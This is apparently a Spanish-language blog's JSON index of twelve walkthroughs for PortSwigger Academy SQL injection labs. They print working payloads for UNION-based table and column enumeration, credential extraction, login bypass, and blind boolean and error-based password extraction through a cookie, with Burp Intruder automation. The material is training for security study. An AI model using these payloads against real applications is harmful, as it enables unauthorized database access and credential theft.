[{"content":"Lab: SQL injection attack, listing the database contents on Oracle En este laboratorio1la finalidad es poder extraer los datos en una base de datos oracle que es muy distinto a como se hace en los otros gestores\nReconocimiento Algo a notar en las consultas al hacer union en MySQL es que al agregar un comentario se debe de agregar un espacio, como ejemplo union select null--  notese el espacio al final para que el sistema pueda comentar correctamente, en otros gestores no es necesario esto pero MySQL si.\n Algo a tomar en cuenta es que al hacer la solicitud por medio del navegador si se agrega solamente un espacio este no aceptara correctamente la consulta por alguna razon por lo que habria que agregar un - para inyectar correctamente la consulta y contrario por medio de repeater en burpsuite si se puede agregar solo el espacio y sigue mostrando correctamente sin dar un error de servidor.\n Payloads Detectar columnas Pets\u0026#39; order by 1-- - Pets\u0026#39;orderby2-- - Pets\u0026#39; order by 3-- - //Muestra error Detectar string Por lo que se ve al imprimir datos es que las dos columnas recuperan datos string, no es necesario hacer la prueba pero siempre hacerlo cuando se dude.\nPets\u0026#39; union select \u0026#39;test\u0026#39;,\u0026#39;test\u0026#39; from dual-- - Recuperar tablas Ahora recuperar las tablas, en este caso vamos a buscar una tabla que contenga los usuarios, en este caso es la tabla USERS_TMNLZU y es la que se lista.\nPets\u0026#39; union select table_name,null from all_tables-- -  Tablas \nRecuperar columnas Para detectar el nombre de las columnas en las tablas se inyecta la siguiente consulta, indicando la tabla de la que se quiere extraer.\nPets\u0026#39; union select column_name,null from all_tab_columns where table_name = \u0026#39;USERS_TMNLZU\u0026#39;-- -  Columnas de tabla USERS_TMNLZU \nExtraer datos Ahora podremos recuperar los datos teniendo el nombre de las columnas y el nombre de las tablas.\nPets\u0026#39; union select USERNAME_KNMULR,PASSWORD_KQXSZA from USERS_TMNLZU-- -  Datos extraidos de la tabla USERS_TMNLZU \nY con esto hemos resulto el lab:\n Laboratorio resuelto \nCon esto ya muestra que se ha resuelto el lab.\n  Laboratorio\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n   ","date":"2021-11-07T00:00:00Z","image":"https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/head_huc76dcbe4719eea5620ad72b9e0798e52_74880_120x120_fill_box_smart1_3.png","permalink":"https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/","title":"Portswigger Academy Learning Path: SQL Injection Lab 10"},{"content":"Lab: Blind SQL injection with conditional responses En este laboratorio1la finalidad es poder extraer la contrasena del usuario administrator, para eso se nos dan las columnas username y password de la tabla users.\nReconocimiento Lo primero es buscar donde es vulnerable a sql injection, en este caso nos dicen en el articulo que seguramente es la cookie de TrackingId solo queda comprobarlo.\nPayloads Detectar si es vulnerable TrackingId=xxxxxxxxxxxxxxxx' and '1'='1; //Muestra welcome back TrackingId=xxxxxxxxxxxxxxxx' and '1'='2; //No muestra welcome back  Peticion enviada al servidor \nAl inyectar la solicitud podemos darnos cuenta que el sistema valida la cookie dependiendo de la respuesta de mysql, si hacemos una comparacion que no es correcta, el sistema ya no imprime welcome back.\nVerificar tamano de la contrasena de administrator Ahora toca construir una consulta para inyectar para poder extraer los datos de base de datos de users\nTrackingId=xxxxxxxxxxxxxxxx\u0026#39; and (select length(password) from users where username=\u0026#39;administrator\u0026#39;)=1-- La siguiente solicitud lo que hace es hacer un select del tamano de la contrasena del usuario administrator y el valor numerico es el que ira cambiando, y hasta que el sistema devuelva la respuesta welcome back es porque es lo correcto, todo basandose en que la respuesta sea true si imprimira ese resultado.\nEn este caso construimos la siguiente captura para saber el valor del tamano de la contrasena para posteriormente ir cambiando el valor de la consulta y hacer un ataque con intruder en burpsuite para evitar hacerlo a mano y durar mucho en el proceso. Para eso crafteamos la siguiente solicitud, y agregamos como payload el valor numerico para ir cambiandolo y averiguar el tamano de la contrasena administrador.\n Solicitud que se enviara \nLuego agregaremos el payload para que acepte numeros e ir probando uno por uno para posteriormente analizar el resultado. El\n Payloads con valores numericos \nY finalmente haremos un grep en la respuesta ya que si recibimos la palabra welcome back es porque ese es el tamano de la contrasena. Si\n Grep de la respuesta recibida \nY ejecutando el ataque podemos ver que la contrasena tiene un tamano de 20.\n Ataque realizado \nTomar los datos del usuario administrator Sabiendo ya el tamano ya podemos proceder a tomar la contrasena del usuario administrator, para eso inyectaremos la siguiente solicitud:\nTrackingId=xxxxxxxxxxxxxxxx\u0026#39; and (select substr(password,1,1) from users where username=\u0026#39;administrator\u0026#39;)=\u0026#39;A\u0026#39;--  SUBSTR: Son 3 valores los que espera que serian\n Variable: Puede ser nombre de tabla, string, nombre de columna Segundo valor: A este se le indica desde donde quiere que se empiece a tomar en cuenta, este es el que ira cambiando Tercero: Cuantos valores quiere que se imprima, en este caso solo queremos 1   Para el uso de texto enviaremos peticiones con valores del abecedario y valores numericos, para eso es mejor utilizar la siguiente lista de caracteres alfanumericos2Y ahora vamos a intruder y configuramos de la siguiente manera, de forma de cluster bomb para enviar 2 parametros y que pruebe todas las combinaciones.\n NOTA: En las capturas se muestra el valor alfanumerico sin comillas simples, por lo cual se debe de colocar\n  Configuracion de posicion \nAhora a configurar los payloads tanto del valor 1 como del 2:\n Configuracion de payload 1   Configuracion de payload 2 \nY en este caso ya hemos obtenido los resultados, solamente queda unirlos para entrar como el usuario administrator que quedaria con el password inpxkyrid4icz30lq1v8:\n Ataque con cluster bomb \nY con esto hemos resulto el lab:\n Laboratorio resuelto \nCon esto ya muestra que se ha resuelto el lab.\n  Laboratorio\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n Caracteres alfanumericos\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n   ","date":"2021-11-07T00:00:00Z","image":"https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/head_huc76dcbe4719eea5620ad72b9e0798e52_74880_120x120_fill_box_smart1_3.png","permalink":"https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/","title":"Portswigger Academy Learning Path: SQL Injection Lab 11"},{"content":"# Lab: Blind SQL injection with conditional errors En este laboratorio1la finalidad es poder extraer la contrasena de la tabla users del usuario administrator. Ademas se indica que esta utilizando en el backend Oracle por lo cual procederemos a buscar la informacion sobre este.\nReconocimiento Al abrir la aplicacion vemos que ya no se comporta como en el Lab11 lo que nos permitia que segun la respuesta devuelta por el servidor saber si la consulta que realizabamos era true o false.\nAhora lo que se puede hacer es inyectar una consulta SQL que nos genere ese error a proposito para saber si la consulta es true o false y el error terminara dando un error en el servidor y nos guiaremos por eso. Y ya que sabemos que es un backend Oracle haremos la siguiente prueba a inyectar en la cookie\nEn este caso inyectaremos la siguiente peticion:\nxxxxx\u0026#39; AND (SELECT CASE WHEN (1=2) THEN to_char(1/0) ELSE \u0026#39;a\u0026#39; END FROM dual)=\u0026#39;a//muestralapaginanormalxxxxx\u0026#39; AND (SELECT CASE WHEN (1=1) THEN to_char(1/0) ELSE \u0026#39;a\u0026#39; END FROM dual)=\u0026#39;a//muestraunerrordeservidorLo que hace practicamente es que se cumpla la condicion de la cookie y luego la dentro del select genera un propio error que nos dira si es true o false segun la condicion que queramos, en este caso de prueba se valida con 1=1 o 1=2 aqui genera error del servidor solo si se cumple como pasa con la condicion 1=1, practicamente es un codigo que en cualquier lenguaje de programacion se ve, por ultimo si la condicion no es correcta como la salida sera 'a' solo valida que sea igual a la ultima a ingresada 'a con una sola comilla al inicio para que la ultima la agregue el propio sistema a la que le colocaria a la cookie.\nPayloads Recuperar tamano de contrasena Como en el laboratorio anterior tocara saber el tamano de la contrasena y para eso utilizaremos la siguiente consulta inyectada:\nxxxxx\u0026#39; AND (SELECT CASE WHEN ((select length(password) from users where username=\u0026#39;administrator\u0026#39;)=ยง20ยง) THEN to_char(1/0) ELSE \u0026#39;a\u0026#39; END FROM dual)=\u0026#39;aEsta inyeccion hace validar el tamano de la contrasena, si la contrasena tiene el tamano que se le indica hara que la aplicacion genere un error 500 en el servidor de Internal Server Error.\n Payload a enviar el ataque por intruder \nAl valor se le hara una peticion de 1 hasta 30 para saber cual es el tamano de la contrasena y como se muestra la aplicacion genera un error 500 con el payload 20 lo que significa que la contrasena tiene 20 caracteres.\n Ataque con intruder \nRecuperar la contrasena Ahora que sabemos el tamano ya podemos enviar la peticion para recuperarla, ahora para recuperar la contrasena utilizaremos la siguiente consulta para inyectar:\nxxxxx\u0026#39; AND (SELECT CASE WHEN ((select SUBSTR(password, 1, 1) from users where username=\u0026#39;administrator\u0026#39;)=\u0026#39;a\u0026#39;) THEN to_char(1/0) ELSE \u0026#39;a\u0026#39; END FROM dual)=\u0026#39;aAhora vamos a realizar un ataque de clusterbomb enviando en el primer parametro el valor que cambiara de 1 a 20 y en el segundo un caracter alfanumerico.\n Ataque de cluster bomb \nY al terminar el ataque podemos notar que los que dan un error 500 del lado servidor son donde la condicion fue true y toca tomar toda esa informacion para formar la contrasena:\n Resoyestas del ataque con error de respuesta 500 \nAl finalizar y formar la contrasena seria gt4dyzmn4weyzcdog1n1 y podemos iniciar sesion en la aplicacion para completar el laboratorio\nY con esto hemos resulto el lab:\n Laboratorio resuelto \nCon esto ya muestra que se ha resuelto el lab.\n  Laboratorio\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n   ","date":"2021-11-06T00:00:00Z","image":"https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-12/head_huc76dcbe4719eea5620ad72b9e0798e52_74880_120x120_fill_box_smart1_3.png","permalink":"https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-12/","title":"Portswigger Academy Learning Path: SQL Injection Lab 12"},{"content":"Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft En este laboratorio1la finalidad es poder extraer la version de la base de datos MySQL o Microsoft SQL Server y poder imprimir en las tablas que se presentan. La string que deberiamos de recuperar es 8.0.27\nReconocimiento Algo a notar en las consultas al hacer union en MySQL es que al agregar un comentario se debe de agregar un espacio, como ejemplo union select null--  notese el espacio al final para que el sistema pueda comentar correctamente, en otros gestores no es necesario esto pero MySQL si.\n Algo a tomar en cuenta es que al hacer la solicitud por medio del navegador si se agrega solamente un espacio este no aceptara correctamente la consulta por alguna razon por lo que habria que agregar un - para inyectar correctamente la consulta y contrario por medio de repeater en burpsuite si se puede agregar solo el espacio y sigue mostrando correctamente sin dar un error de servidor.\n Payloads Detectar columnas Gifts\u0026#39; order by 1-- - Gifts\u0026#39;orderby2-- - Gifts\u0026#39; order by 3-- - //Muestra error Detectar string Por lo que se ve al imprimir datos es que las dos columnas recuperan datos string, no es necesario hacer la prueba pero siempre hacerlo cuando se dude.\nGifts\u0026#39; union select \u0026#39;test\u0026#39;,\u0026#39;test\u0026#39;-- - Recuperar version Ahora recuperar la version, las consultas utilizadas para esto en Oracle son las siguientes:\nGifts\u0026#39; union select @@version,null-- - Y con esto hemos resulto el lab:\n Laboratorio resuelto \nCon esto ya muestra que se ha resuelto el lab.\n  Laboratorio\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n   ","date":"2021-11-06T00:00:00Z","image":"https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-8/head_huc76dcbe4719eea5620ad72b9e0798e52_74880_120x120_fill_box_smart1_3.png","permalink":"https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-8/","title":"Portswigger Academy Learning Path: SQL Injection Lab 8"},{"content":"Lab: SQL injection attack, listing the database contents on non-Oracle databases En este laboratorio1la finalidad es poder extraer datos de la base de datos, basandose en inyectar consultas para tomarlos, al final se resuelve el laboratorio iniciando sesion con el usuario administrator.\nReconocimiento Algo a notar en las consultas al hacer union en MySQL es que al agregar un comentario se debe de agregar un espacio, como ejemplo union select null--  notese el espacio al final para que el sistema pueda comentar correctamente, en otros gestores no es necesario esto pero MySQL si.\nPayloads Detectar columnas Gifts\u0026#39; order by 1-- - Gifts\u0026#39;orderby2-- - Gifts\u0026#39; order by 3-- - //Muestra error Detectar string Por lo que se ve al imprimir datos es que las dos columnas recuperan datos string, no es necesario hacer la prueba pero siempre hacerlo cuando se dude.\nGifts\u0026#39; union select \u0026#39;test\u0026#39;,\u0026#39;test\u0026#39;-- - Recuperar tablas Gifts\u0026#39; union select null,table_name fRoM information_schema.tables-- -  Listado de Tablas \nRecuperar nombres de columnas de la tabla users_fcqnpf Gifts\u0026#39; union select null,column_name fRoM information_schema.columns wHeRe table_name=\u0026#39;users_fcqnpf\u0026#39;-- -  Listado de columnas de la tabla users_fcqnpf \nRecuperar Datos Gifts\u0026#39; union select username_nrukiy,password_ebqikr from users_fcqnpf-- -  Usuarios y Contrasenas extraidos \nY con esto hemos resulto el lab:\n Laboratorio resuelto \nCon esto ya muestra que se ha resuelto el lab.\n  Laboratorio\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n   ","date":"2021-11-06T00:00:00Z","image":"https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/head_huc76dcbe4719eea5620ad72b9e0798e52_74880_120x120_fill_box_smart1_3.png","permalink":"https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/","title":"Portswigger Academy Learning Path: SQL Injection Lab 9"},{"content":"Lab: SQL injection UNION attack, determining the number of columns returned by the query En este laboratorio1la finalidad es recuperar el numero de columnas de la tabla a la que se esta realizando la consulta, para posteriormente poder extraer los datos basandose en ese numero de columnas. Para este caso se puede hacer uso de dos metodos que pueden ser ORDER BY ? o UNION SELECT NULL,NULL,NULL...\nUsando algunos de estos dos podemos recuperar el numero de columnas, sabiendo que a la hora que la aplicacion genere un error no sera el numero de columna correcta, claramente si usamos un order by 9 y secuencialmente llegamos hasta el 10 quiere decir que esa tabla cuenta con 9 columnas y son las que utilizaremos posteriormente para imprimir los datos.\nUnion select null funciona igualmente, si agregamos 9 null y al agregar un null mas nos muestra error quiere decir que esa tabla solo cuenta con 9 columnas. Un ejemplo de uso en una consulta sql seria:\nselect*fromtablawherenombre=\u0026#39;test\u0026#39;orderby1-- select*fromtablawherenombre=\u0026#39;test\u0026#39;orderby2-- select*fromtablawherenombre=\u0026#39;test\u0026#39;orderby3-- select*fromtablawherenombre=\u0026#39;test\u0026#39;orderbyn-- select*fromtablawherenombre=\u0026#39;test\u0026#39;unionselectnull-- select*fromtablawherenombre=\u0026#39;test\u0026#39;unionselectnull,null-- select*fromtablawherenombre=\u0026#39;test\u0026#39;unionselectnull,null,null-- select*fromtablawherenombre=\u0026#39;test\u0026#39;unionselectnull,null,null,null-- Reconocimiento Ingresamos a la web y elegimos alguna categoria, en este ejemplo sera la categoria Pets.Ahora es momento de ir probando secuencialmente numero en numero y ver hasta que valor nos dara el error:\nPayloads    Payload Resultado     Pets' order by 1\u0026ndash; Imprime resultados normalmente   Pets' order by 2\u0026ndash; Imprime resultados normalmente   Pets' order by 3\u0026ndash; Imprime resultados normalmente   Pets' order by 4\u0026ndash; Muestra error   Pets' UNION SELECT NULL\u0026ndash; Muestra error   Pets' UNION SELECT NULL,NULL\u0026ndash; Muestra error   Pets' UNION SELECT NULL,NULL,NULL\u0026ndash; Imprimer resultados normalmente   Pets' UNION SELECT NULL,NULL,NULL,NULL\u0026ndash; Muestra error    Como se ve al ingresar el valor 4 o 1,2 y 4 nulls, nos muestra un error de Internal server error lo que hace que el backend no este respondiendo de manera correcta y no pueda procesar la solicitud. Con esto sabemos que la tabla en la que se extrae los datos cuenta con 3 columnas.\n Laboratorio resuelto \n  Laboratorio\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n   ","date":"2021-11-04T00:00:00Z","image":"https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-3/head_huc76dcbe4719eea5620ad72b9e0798e52_74880_120x120_fill_box_smart1_3.png","permalink":"https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-3/","title":"Portswigger Academy Learning Path: SQL Injection Lab 3"},{"content":"Lab: SQL injection UNION attack, finding a column containing text En este laboratorio1la finalidad es saber el tipo de datos que es utilizado en los valores que son enviadas en la consulta, ya que es necesario saber que tipo de valor son para que el sistema no genere errores al momento de extraeros, utilizaremos la informacion anterior primero enumerando el numero de columnas, y al hacer el reconocimiento sabemos que cuenta con 3 columnas ya que es la unica que no genera un error.\nPets\u0026#39; UNION SELECT NULL,NULL,NULL-- Reconocimiento Ingresamos a la web y al acceder en mi caso me pide que imprima el valor mO7mSy al recuperar los datos, asi que buscaremos que valores aceptan string para poder imprimirlo\nPayloads    Payload Resultado     Pets' UNION SELECT \u0026lsquo;test\u0026rsquo;,NULL,NULL\u0026ndash; Muestra error   Pets' UNION SELECT NULL,\u0026lsquo;test\u0026rsquo;,NULL\u0026ndash; Imprime resultados normalmente   Pets' UNION SELECT NULL,NULL,\u0026lsquo;test\u0026rsquo;\u0026ndash; Muestra error    Nos podemos dar cuenta que la columna dos permite que se puedan ingresar datos de tipo string ahora toca ingresar la cadena que nos indican para poder resolver el lab, inyectando la consulta sql:\nPets\u0026#39; UNION SELECT NULL,\u0026#39;mO7mSy\u0026#39;,NULL--  Laboratorio resuelto \n  Laboratorio\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n   ","date":"2021-11-04T00:00:00Z","image":"https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-4/head_huc76dcbe4719eea5620ad72b9e0798e52_74880_120x120_fill_box_smart1_3.png","permalink":"https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-4/","title":"Portswigger Academy Learning Path: SQL Injection Lab 4"},{"content":"Lab: Lab: SQL injection UNION attack, retrieving data from other tables En este laboratorio1la finalidad es poder extraer los datos de una tabla, las columnas son username y password de la tabla users. La idea es hacer uso del metodo union en sql para poder extraer esos datos aparte de los que ya trae el sistema. La consulta comun para recuperar estos datos seria:\nselectusername,passwordfromusers;Reconocimiento Ahora toca usar el metodo union para poder recuperar esos datos y tratar de inyectar ese comando en la consulta primaria para recuperar los usuarios y contrasenas de la tala de usuarios.\nPayloads Recuperar columnas Recuperamos las columnas inyectando la siguiente consulta:\nhttps://xxxxxxxxxxxx.web-security-academy.net/filter?category=Pets' order by 4-- Recuperar tipo de datos Ahora queremos saber que tipos de datos acceptan, inyectando algunas string en los dos vemos que no hay problema al hacerlo.\nPets\u0026#39; union select \u0026#39;test\u0026#39;,\u0026#39;test\u0026#39;--  Tipo de Datos aceptados \nRecuperar datos de usuarios Ahra ya podemos tomar los datos de la tabla de usuarios que se nos pide, para eso inyectaremos la siguiente consulta:\nPets\u0026#39; union select username,password from users--  Usuarios y Contrasenas de la tabla users \nAhora que ya nos hicimos con los datos del administrador, podemos iniciar sesion para que el sistema ya nos tome como resuelto el lab.\n Laboratorio resuelto \n  Laboratorio\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n   ","date":"2021-11-04T00:00:00Z","image":"https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-5/head_huc76dcbe4719eea5620ad72b9e0798e52_74880_120x120_fill_box_smart1_3.png","permalink":"https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-5/","title":"Portswigger Academy Learning Path: SQL Injection Lab 5"},{"content":"Lab: SQL injection UNION attack, retrieving multiple values in a single column En este laboratorio1la finalidad es poder extraer los datos de una tabla, las columnas son username y password de la tabla users. Es igual al anterior lab solamente que esta vez se tiene que extraer los datos en una sola columna haciendo uso de una consulta sql. La forma que tiene SQL para poder extraer datos de esa manera es de la siguiente:\n   DBMS Concatenacion     Oracle \u0026lsquo;foo\u0026rsquo;||\u0026lsquo;bar\u0026rsquo;   Microsoft \u0026lsquo;foo\u0026rsquo;+\u0026lsquo;bar\u0026rsquo;   Postgresql \u0026lsquo;foo\u0026rsquo;||\u0026lsquo;bar\u0026rsquo;   MySQL \u0026lsquo;foo\u0026rsquo; \u0026lsquo;bar\u0026rsquo;    Reconocimiento Ahora toca usar el metodo union para poder recuperar esos datos y tratar de inyectar ese comando en la consulta primaria para recuperar los usuarios y contrasenas de la tala de usuarios.\nPayloads Estos pasos se repetiran los mismos del laboratorio anterior Lab5.\nRecuperar columnas Recuperamos las columnas inyectando la siguiente consulta:\nhttps://xxxxxxxxxxxx.web-security-academy.net/filter?category=Pets' order by 1-- https://xxxxxxxxxxxx.web-security-academy.net/filter?category=Pets' order by 2-- https://xxxxxxxxxxxx.web-security-academy.net/filter?category=Pets' order by 3-- Al ver que en 2 muestra bien y en 3 da un error interno, sabemos que cuenta con 2 columnas.\nRecuperar tipo de datos Ahora queremos saber que tipos de datos acceptan, inyectando algunas string en los dos vemos que no hay problema al hacerlo.\nPets\u0026#39; union select \u0026#39;test\u0026#39;,\u0026#39;test\u0026#39;-- Pets\u0026#39;unionselect\u0026#39;test\u0026#39;,null-- Pets\u0026#39; union select null,\u0026#39;test\u0026#39;-- Ahora sabemos que solo podemos inyectar texto en el una columna que seria la segunda.\nRecuperar datos de usuarios Ahra ya podemos tomar los datos de la tabla de usuarios que se nos pide, para eso inyectaremos las siguientes consultas:\nPets\u0026#39; union select null,username from users-- Pets\u0026#39;unionselectnull,passwordfromusers--  Contrasenas de la tabla users \nPero haciendo dos consultas es muy complicado recuperar todos estos datos y luego unirlos y saber que valor es de cada uno. Para eso podemos usar la concatenacion que es propia del sistema, solo es de saber que sistema se esta usando en el backend realizando pruebas, probaremos con todos y ver si nos arroja un resultado. La consultaria quedaria asi:\nPets\u0026#39; union select null,username password from users-- Pets\u0026#39;unionselectnull,username||passwordfromusers-- Pets\u0026#39; union select null,username+password from users-- Ahora con alguno de los payloads ingresados pudimos recuperar los datos en una misma columna como se puede ver y ya contamos con el usuario y las credenciales, ya solo queda ingresar al sistema y resuelto.\n Laboratorio resuelto \nAlgo para finalizar que se podria hacer es agregar un guion para saber cuando termina una columna de la otra, esto se arregla agregando cualquier caracter en el medio, por ejemplo un -:\nPets\u0026#39; union select null,username||\u0026#39;-\u0026#39;||password from users--   Laboratorio\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n   ","date":"2021-11-04T00:00:00Z","image":"https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-6/head_huc76dcbe4719eea5620ad72b9e0798e52_74880_120x120_fill_box_smart1_3.png","permalink":"https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-6/","title":"Portswigger Academy Learning Path: SQL Injection Lab 6"},{"content":"Lab: SQL injection attack, querying the database type and version on Oracle En este laboratorio1la finalidad es poder extraer la version de Oracle especificamente algo sobre este string Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production, PL/SQL Release 11.2.0.2.0 - Production, CORE 11.2.0.2.0 Production, TNS for Linux: Version 11.2.0.2.0 - Production, NLSRTL Version 11.2.0.2.0 - Production\nReconocimiento Ya que sabemos que el gestor es Oracle, se utilizaran payloads de Oracle y la manera de extraer los datos es muy diferente, siguiendo los pasos anteriores tocara enumerar columnas\nPayloads Detectar columnas Pets\u0026#39; order by 1-- Pets\u0026#39;orderby2-- Pets\u0026#39; order by 3-- //Genera error Detectar string Por lo que se ve al imprimir datos es que las dos columnas recuperan datos string, no es necesario hacer la prueba pero siempre hacerlo cuando se dude. En este caso Oracle como se nota no se puede enviar un select sin el valor from, ya que es algo propio de Oracle que es una tabla especial.\nPets\u0026#39; union select \u0026#39;test\u0026#39;,\u0026#39;test\u0026#39; from DUAL-- Recuperar version Ahora recuperar la version, las consultas utilizadas para esto en Oracle son las siguientes:\nSELECTbannerFROMv$versionSELECTversionFROMv$instanceLa inyeccion quedaria de la siguiente manera:\nPets\u0026#39; union SELECT banner,null FROM v$version-- Pets\u0026#39;unionSELECTversion,nullFROMv$instance--  Laboratorio resuelto \nCon esto ya muestra que se ha resuelto el lab.\n  Laboratorio\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n   ","date":"2021-11-04T00:00:00Z","image":"https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-7/head_huc76dcbe4719eea5620ad72b9e0798e52_74880_120x120_fill_box_smart1_3.png","permalink":"https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-7/","title":"Portswigger Academy Learning Path: SQL Injection Lab 7"},{"content":"Lab: SQL injection vulnerability allowing login bypass En este laboratorio se pretende explotar un SQL Injection, esta vez es un inicio de sesion, y se intentara explotar como en el laboratorio 1 en el cual se tiene que tratar de hacer un bypass para que el sistema no valide el resto que seria la contrasena. La consulta que hara seguramente sera:\nSELECT*FROMusersWHEREusername=\u0026#39;usuario\u0026#39;ANDpassword=\u0026#39;contrasena\u0026#39;Reconocimiento Se tratara de hacer que el sistema ya no invalide la contrasena que es enviada en la peticion, todo esto comentando lo que le sigue, de esta manera:\nSELECT*FROMusersWHEREusername=\u0026#39;usuario\u0026#39;--\u0026#39; AND password = \u0026#39;contrasena\u0026#39; De esta manera solo valida al usuario y la contrasena se mantiene comentada.\nExplotacion En este caso hay que hacerse con el usuario administrator del sistema, asi que se procede a realizar la siguiente inyeccion:\nadministrator' or 1=1--\n Payload inyectado en usuario \nque quedaria asi al ejecutar la consulta:\nSELECT*FROMusersWHEREusername=\u0026#39;administrator\u0026#39;or1=1--\u0026#39; AND password = \u0026#39;contrasena\u0026#39; Finalmente hemos resuelto el lab:\n Login Bypass \nTambien hubiera sido posible utilizar una lista1para realizar un ataque con intruder pero esta vez no fue necesario ya que el bypass es basico, pero se podria intentar.\n  Lista de payloads bypass login\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n   ","date":"2021-11-02T00:00:00Z","image":"https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-2/headlab2_huc76dcbe4719eea5620ad72b9e0798e52_74880_120x120_fill_box_smart1_3.png","permalink":"https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-2/","title":"Portswigger Academy Learning Path: SQL Injection Lab 2"},{"content":"Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data Este laboratorio contiene una vulnerabilidad de SQL Injection y la manera de resolverlo es que haga un ataque de SQL y que muestra los detalles de todos los productos en cualquier categoria, tanto released como unreleased.\nNos regalan una pista y se nos dice que el sistema realiza la siguiente consulta SQL\nSELECT*FROMproductsWHEREcategory=\u0026#39;Gifts\u0026#39;ANDreleased=1Reconocimiento Como lo explica en la lectura del laboratorio, la aplicacion recupera datos de la categoria Gifts y que solo se muestre los datos que tengan released como valor 1.\nPayloads He probado los siguientes payloads para saber si podria mostrar el resto de productos que no esta mostrando anteriormente.\n   Payload Accion     Gifts'\u0026ndash; Muestra solo 1 producto mas   Gifts'\u0026ndash; - Muestra solo 1 producto master   Gifts' and released = 0\u0026ndash; Muestra solo 1 producto    Explotacion Al notar como hace la validacion nos podemos dar cuenta que podriamos bypassear esa instruccion, recordando a la forma en que se hace un bypass a un login. Creando la siguiente consulta a inyectar quedaria: SQL\nGifts' or 1=1--\nPara que al final al inyectar la consulta SQL quedaria: SQL\nSELECT*FROMproductsWHEREcategory=\u0026#39;Gifts\u0026#39;or1=1-- AND released = 1 Haciendo que despues de -- se comente lo que le sigue y solo se ejecute lo primero. Adicionalmente no existe solo ese payload, se puede hacer uso de otros como la siguiente lista1Y por el tamano de la salida nos podemos dar cuenta que arroja muchos datos, aunque un payload no sea aceptado se puede hacer uso de otros.\n Ataque con intruder \n  Lista de payloads bypass login\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n   ","date":"2021-11-01T00:00:00Z","image":"https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-1/head_huc76dcbe4719eea5620ad72b9e0798e52_74880_120x120_fill_box_smart1_3.png","permalink":"https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-1/","title":"Portswigger Academy Learning Path: SQL Injection Lab 1"}]